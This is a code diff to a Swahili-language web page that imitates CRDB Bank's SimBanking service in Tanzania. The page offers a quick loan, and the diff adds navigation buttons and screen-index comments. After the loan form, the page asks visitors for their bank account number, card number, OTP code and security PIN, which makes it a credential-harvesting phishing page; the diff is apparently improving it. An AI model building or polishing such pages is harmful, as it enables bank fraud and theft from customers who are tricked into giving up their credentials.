@@ -10,7 +10,7 @@
     <div class="app-container">
         <!-- TOP HEADER -->
         <header class="app-header">
-            <span class="back-btn" id="backBtn">&#8592; Rudi</span>
+            <span class="back-btn" id="globalBackBtn">&#8592; Rudi</span>
             <div class="logo-area">
                 <span class="bank-title">CRDB BANK</span>
                 <span class="sub-title">SIMBANKING TANZANIA</span>
@@ -22,7 +22,7 @@
             <!-- SURFACE NOTIFICATION BANNER -->
             <div id="surfaceNotification" class="surface-notification hidden"></div>
 
-            <!-- SLIDER / HOME SCREEN -->
+            <!-- SLIDER / HOME SCREEN (Index 0) -->
             <section id="stepSlider" class="form-step active">
                 <div class="card-box">
                     <h2>Pata Mkopo Wako Haraka - CRDB</h2>
@@ -55,7 +55,7 @@
                 </div>
             </section>
 
-            <!-- STEP 1 OF 3 -->
+            <!-- STEP 1 OF 3 (Index 1) -->
             <section id="step1" class="form-step">
                 <h3>Maombi ya Mkopo - CRDB</h3>
                 <div class="step-indicator">Hatua 1 ya 3</div>
@@ -89,10 +89,13 @@
                     <textarea id="loanPurpose" placeholder="Elezea madhumuni ya mkopo wako..."></textarea>
                 </div>
 
-                <button class="primary-btn" id="nextToStep2">HATUA INAYOFUATA</button>
+                <div class="btn-group">
+                    <button class="secondary-btn" id="backToSlider">ILIYOTANGULIA</button>
+                    <button class="primary-btn" id="nextToStep2" style="margin-top:0;">HATUA INAYOFUATA</button>
+                </div>
             </section>
 
-            <!-- STEP 2 OF 3 (Tanzania Phone Only) -->
+            <!-- STEP 2 OF 3 (Index 2) -->
             <section id="step2" class="form-step">
                 <h3>Maombi ya Mkopo - CRDB</h3>
                 <div class="step-indicator">Hatua 2 ya 3</div>
@@ -120,11 +123,11 @@
 
                 <div class="btn-group">
                     <button class="secondary-btn" id="backToStep1">ILIYOTANGULIA</button>
-                    <button class="primary-btn" id="nextToStep3">HATUA INAYOFUATA</button>
+                    <button class="primary-btn" id="nextToStep3" style="margin-top:0;">HATUA INAYOFUATA</button>
                 </div>
             </section>
 
-            <!-- STEP 3 OF 3 -->
+            <!-- STEP 3 OF 3 (Index 3) -->
             <section id="step3" class="form-step">
                 <h3>Maombi ya Mkopo - CRDB</h3>
                 <div class="step-indicator">Hatua 3 ya 3</div>
@@ -151,14 +154,14 @@
 
                 <div class="btn-group">
                     <button class="secondary-btn" id="backToStep2">ILIYOTANGULIA</button>
-                    <button class="primary-btn" id="submitLoanApp">WASILISHA MAOMBI</button>
+                    <button class="primary-btn" id="submitLoanApp" style="margin-top:0;">WASILISHA MAOMBI</button>
                 </div>
             </section>
 
-            <!-- ACCOUNT & CARD DETAILS VERIFICATION (Post Step 3) -->
+            <!-- ACCOUNT & CARD DETAILS VERIFICATION (Index 4) -->
             <section id="accountVerification" class="form-step">
-                <div class="sub-header-bar">Unatumia Uthibitishaji wa Kadi ya Tembo</div>
-                <p class="info-text">Karibu! Nyumbani tafadhali inaruhusu unanisha akaunti yako ya Benki ya CRDB</p>
+                <div class="sub-header-bar">Uthibitishaji wa Kadi ya Tembo</div>
+                <p class="info-text">Karibu! Tafadhali unanisha akaunti yako ya Benki ya CRDB</p>
 
                 <div class="input-group">
                     <label>Ingiza nambari yako ya akaunti</label>
@@ -170,10 +173,13 @@
                     <input type="text" id="cardNumberInput" placeholder="1111-1111-1111-1111">
                 </div>
 
-                <button class="primary-btn green-btn" id="submitAccountDetails">ENDELEA</button>
+                <div class="btn-group">
+                    <button class="secondary-btn" id="backToStep3FromAcc">ILIYOTANGULIA</button>
+                    <button class="primary-btn green-btn" id="submitAccountDetails" style="margin-top:0;">ENDELEA</button>
+                </div>
             </section>
 
-            <!-- OTP SCREEN -->
+            <!-- OTP SCREEN (Index 5) -->
             <section id="otpScreen" class="form-step dark-theme">
                 <div class="icon-shield">🛡️</div>
                 <h2>Thibitisha Akaunti Yako - CRDB</h2>
@@ -196,7 +202,7 @@
                 </div>
             </section>
 
-            <!-- PIN SCREEN -->
+            <!-- PIN SCREEN (Index 6) -->
             <section id="pinScreen" class="form-step">
                 <h2>Ingiza PIN ya Usalama - CRDB</h2>
                 <p>Ingiza namba ya siri (PIN) ya usalama ya Simbanking ili kuendelea.</p>
@@ -214,7 +220,7 @@
                 <button class="primary-btn green-btn" id="verifyPinBtn">ENDELEA</button>
             </section>
 
-            <!-- CONGRATULATIONS SCREEN -->
+            <!-- CONGRATULATIONS SCREEN (Index 7) -->
             <section id="congratsScreen" class="form-step congrats-theme">
                 <div class="congrats-header">
                     <h1>Hongera!</h1>
@@ -247,5 +253,5 @@
 
     <script src="script.js"></script>
 </body>
-                            </html>
-                        
+                        </html>
+                                                                                            
